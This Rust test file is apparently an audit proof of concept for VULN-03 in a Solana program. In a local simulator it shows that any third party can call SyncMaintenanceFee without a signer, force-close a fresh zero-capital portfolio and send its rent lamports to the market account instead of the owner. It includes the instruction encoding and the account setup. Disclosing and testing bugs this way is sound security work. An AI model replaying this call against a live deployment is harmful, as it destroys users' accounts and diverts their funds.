#![cfg(not(kani))]
//! PoC for VULN-03: force-close via SyncMaintenanceFee sends portfolio
//! rent-lamports to the market account, not to the portfolio owner.
//!
//! handle_sync_maintenance_fee (src/v16_program.rs:9211) requires no signer.
//! When a portfolio satisfies is_empty_for_dematerialization (capital==0,
//! no open positions, no pending payout receipt), the handler calls
//! close_portfolio_account_to_market_slab (line 13184) which zeroes the
//! portfolio data and transfers its lamports to market_ai — not to the
//! portfolio owner.
//!
//! A fresh zero-capital portfolio (InitPortfolio, no deposits) satisfies
//! all dematerialization conditions immediately, so no large fee-per-slot
//! or time advance is required.  Any third party can trigger this.
//!
//! Instruction encoding:
//!   SyncMaintenanceFee { now_slot: u64 } = 48 || u64 now_slot

use litesvm::LiteSVM;
use percolator_prog::{
    ix::Instruction as ProgInstruction,
    processor::ASSET_ACTION_ACTIVATE,
    state,
};
use solana_sdk::{
    account::Account,
    compute_budget::ComputeBudgetInstruction,
    instruction::{AccountMeta, Instruction},
    program_option::COption,
    program_pack::Pack,
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::{Transaction, TransactionError},
};
use spl_token::state::Mint;
use std::path::PathBuf;

// ── path helpers ──────────────────────────────────────────────────────────────

const MAX_PORTFOLIO_ASSETS: u16 = 1;

fn program_path() -> PathBuf {
    let mut p = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    p.push("target/deploy/percolator_prog.so");
    assert!(p.exists(), "BPF missing at {p:?} — run `cargo build-sbf`");
    p
}

fn spl_token_path() -> PathBuf {
    let cargo_home = std::env::var_os("CARGO_HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|| {
            let mut h = PathBuf::from(std::env::var_os("HOME").expect("HOME"));
            h.push(".cargo");
            h
        });
    for entry in std::fs::read_dir(cargo_home.join("registry/src")).expect("registry/src") {
        let cand = entry.expect("dir entry").path()
            .join("litesvm-0.1.0/src/spl/programs/spl_token-3.5.0.so");
        if cand.exists() {
            return cand;
        }
    }
    panic!("spl_token-3.5.0.so not found");
}

fn canonical_vault_ata(vault_authority: &Pubkey, mint: &Pubkey) -> Pubkey {
    let ata: Pubkey = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL".parse().unwrap();
    Pubkey::find_program_address(
        &[vault_authority.as_ref(), spl_token::ID.as_ref(), mint.as_ref()],
        &ata,
    ).0
}

// ── harness ───────────────────────────────────────────────────────────────────

struct Env {
    svm: LiteSVM,
    program_id: Pubkey,
    payer: Keypair,
    admin: Keypair,
    market: Pubkey,
    mint: Pubkey,
    portfolio_len: usize,
}

impl Env {
    fn new() -> Self {
        let mut svm = LiteSVM::new();
        let program_id = percolator_prog::id();
        svm.add_program(program_id, &std::fs::read(program_path()).expect("wrapper BPF"));
        svm.add_program(spl_token::ID, &std::fs::read(spl_token_path()).expect("spl_token BPF"));

        let payer = Keypair::new();
        let admin = Keypair::new();
        let market = Pubkey::new_unique();
        let mint = Pubkey::new_unique();
        let (vault_authority, _) = Pubkey::find_program_address(&[b"vault", market.as_ref()], &program_id);
        let vault = canonical_vault_ata(&vault_authority, &mint);

        svm.airdrop(&payer.pubkey(), 1_000_000_000_000).unwrap();
        svm.airdrop(&admin.pubkey(), 1_000_000_000_000).unwrap();

        let mut mint_data = vec![0u8; Mint::LEN];
        Mint::pack(Mint { mint_authority: COption::None, supply: 0, decimals: 0, is_initialized: true, freeze_authority: COption::None }, &mut mint_data).unwrap();
        svm.set_account(mint, Account { lamports: 1_000_000_000, data: mint_data, owner: spl_token::ID, executable: false, rent_epoch: 0 }).unwrap();

        let mut vault_data = vec![0u8; spl_token::state::Account::LEN];
        spl_token::state::Account::pack(spl_token::state::Account { mint, owner: vault_authority, amount: 0, delegate: COption::None, state: spl_token::state::AccountState::Initialized, is_native: COption::None, delegated_amount: 0, close_authority: COption::None }, &mut vault_data).unwrap();
        svm.set_account(vault, Account { lamports: 1_000_000_000, data: vault_data, owner: spl_token::ID, executable: false, rent_epoch: 0 }).unwrap();

        let market_len = state::market_account_len_for_capacity(MAX_PORTFOLIO_ASSETS as usize).unwrap();
        svm.set_account(market, Account { lamports: 1_000_000_000, data: vec![0u8; market_len], owner: program_id, executable: false, rent_epoch: 0 }).unwrap();

        let portfolio_len = state::portfolio_account_len_for_market_slots(MAX_PORTFOLIO_ASSETS as usize).unwrap();
        let mut env = Env { svm, program_id, payer, admin, market, mint, portfolio_len };
        let admin_clone = env.admin.insecure_clone();

        // InitMarket
        env.send_ok(
            ProgInstruction::InitMarket {
                max_portfolio_assets: MAX_PORTFOLIO_ASSETS,
                h_min: 0, h_max: 10, initial_price: 100,
                min_nonzero_mm_req: 1, min_nonzero_im_req: 2,
                maintenance_margin_bps: 10_000, initial_margin_bps: 10_000,
                max_trading_fee_bps: 10_000, trade_fee_base_bps: 0,
                liquidation_fee_bps: 0, liquidation_fee_cap: 0,
                min_liquidation_abs: 0, max_price_move_bps_per_slot: 10_000,
                max_accrual_dt_slots: 1, max_abs_funding_e9_per_slot: 0,
                min_funding_lifetime_slots: 1, max_account_b_settlement_chunks: 1,
                max_bankrupt_close_chunks: 1, max_bankrupt_close_lifetime_slots: 100,
                public_b_chunk_atoms: percolator::MAX_VAULT_TVL, maintenance_fee_per_slot: 0,
            },
            vec![
                AccountMeta::new(admin_clone.pubkey(), true),
                AccountMeta::new(market, false),
                AccountMeta::new_readonly(mint, false),
            ],
            &[&admin_clone],
        ).expect("InitMarket");

        // Activate asset 1
        env.send_ok(
            ProgInstruction::UpdateAssetLifecycle {
                action: ASSET_ACTION_ACTIVATE, asset_index: 1, now_slot: 1, initial_price: 100,
                insurance_authority: admin_clone.pubkey().to_bytes(),
                insurance_operator: admin_clone.pubkey().to_bytes(),
                backing_bucket_authority: admin_clone.pubkey().to_bytes(),
                oracle_authority: admin_clone.pubkey().to_bytes(),
            },
            vec![
                AccountMeta::new(admin_clone.pubkey(), true),
                AccountMeta::new(market, false),
            ],
            &[&admin_clone],
        ).expect("UpdateAssetLifecycle");

        env
    }

    fn send_ok(&mut self, ix: ProgInstruction, accounts: Vec<AccountMeta>, signers: &[&Keypair]) -> Result<(), TransactionError> {
        self.svm.expire_blockhash();
        let ixs = vec![
            ComputeBudgetInstruction::request_heap_frame(128 * 1024),
            ComputeBudgetInstruction::set_compute_unit_limit(1_400_000),
            Instruction { program_id: self.program_id, accounts, data: ix.encode() },
        ];
        let mut all = vec![&self.payer];
        all.extend_from_slice(signers);
        let tx = Transaction::new_signed_with_payer(&ixs, Some(&self.payer.pubkey()), &all, self.svm.latest_blockhash());
        self.svm.send_transaction(tx).map(|_| ()).map_err(|e| e.err)
    }

    fn create_portfolio(&mut self, owner: &Keypair) -> Pubkey {
        self.svm.airdrop(&owner.pubkey(), 1_000_000_000).unwrap();
        let portfolio = Pubkey::new_unique();
        self.svm.set_account(portfolio, Account { lamports: 1_000_000_000, data: vec![0u8; self.portfolio_len], owner: self.program_id, executable: false, rent_epoch: 0 }).unwrap();
        self.send_ok(
            ProgInstruction::InitPortfolio,
            vec![
                AccountMeta::new(owner.pubkey(), true),
                AccountMeta::new(self.market, false),
                AccountMeta::new(portfolio, false),
            ],
            &[owner],
        ).expect("InitPortfolio");
        portfolio
    }
}

// ── PoC test ──────────────────────────────────────────────────────────────────

/// Proves VULN-03: a fresh zero-capital portfolio can be force-closed by any
/// third party via SyncMaintenanceFee, with its rent-lamports going to the
/// market account rather than back to the portfolio owner.
///
/// Assertions:
///   1. victim_portfolio.lamports() == 0 after the call (account closed)
///   2. market.lamports() == market_before + portfolio_before (lamports captured)
///   3. victim_owner.lamports() == owner_before (owner received nothing)
#[test]
fn vuln03_force_close_rent_goes_to_market_not_owner() {
    let mut env = Env::new();

    // Create victim's portfolio — zero capital, no positions (freshly initialized)
    let victim = Keypair::new();
    let victim_portfolio = env.create_portfolio(&victim);

    // Snapshot lamports before the attack
    let portfolio_lamports_before = env.svm.get_account(&victim_portfolio).unwrap().lamports;
    let market_lamports_before = env.svm.get_account(&env.market).unwrap().lamports;
    let owner_lamports_before = env.svm.get_account(&victim.pubkey()).unwrap().lamports;

    assert!(portfolio_lamports_before > 0, "portfolio must have rent-exempt lamports");

    // ── attack: any third party calls SyncMaintenanceFee (no signer required) ─
    // The payer here is not the portfolio owner — anyone can do this.
    env.send_ok(
        ProgInstruction::SyncMaintenanceFee { now_slot: 2 },
        vec![
            AccountMeta::new(env.market, false),
            AccountMeta::new(victim_portfolio, false),
            // no cranker_portfolio_ai — omitted to keep the PoC minimal
        ],
        &[], // no extra signers needed
    ).expect("SyncMaintenanceFee must succeed — no signer required");

    // ── assert lamport destinations ───────────────────────────────────────────

    // 1. Portfolio account is closed
    let portfolio_lamports_after = env.svm
        .get_account(&victim_portfolio)
        .map(|a| a.lamports)
        .unwrap_or(0);
    assert_eq!(portfolio_lamports_after, 0, "portfolio account should be closed (0 lamports)");

    // 2. Market captured the portfolio's SOL — NOT the owner
    let market_lamports_after = env.svm.get_account(&env.market).unwrap().lamports;
    assert_eq!(
        market_lamports_after,
        market_lamports_before + portfolio_lamports_before,
        "market should have gained the portfolio's lamports"
    );

    // 3. Owner received nothing — their SOL is gone
    let owner_lamports_after = env.svm.get_account(&victim.pubkey()).unwrap().lamports;
    assert_eq!(
        owner_lamports_after, owner_lamports_before,
        "portfolio owner's lamports must be unchanged — they never received the rent back"
    );
}
